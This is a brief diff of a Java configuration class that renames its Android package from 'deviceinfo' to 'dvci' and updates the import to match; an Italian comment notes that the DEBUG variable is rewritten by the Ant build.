@@ -1,6 +1,6 @@
-package com.android.deviceinfo.auto;
+package com.android.dvci.auto;
 
-import com.android.deviceinfo.auto.Cfg;
+import com.android.dvci.auto.Cfg;
 
 public class Cfg {
 	//ATTENZIONE, NON CAMBIARE A MANO LA VARIABILE DEBUG, VIENE RISCRITTA DA ANT
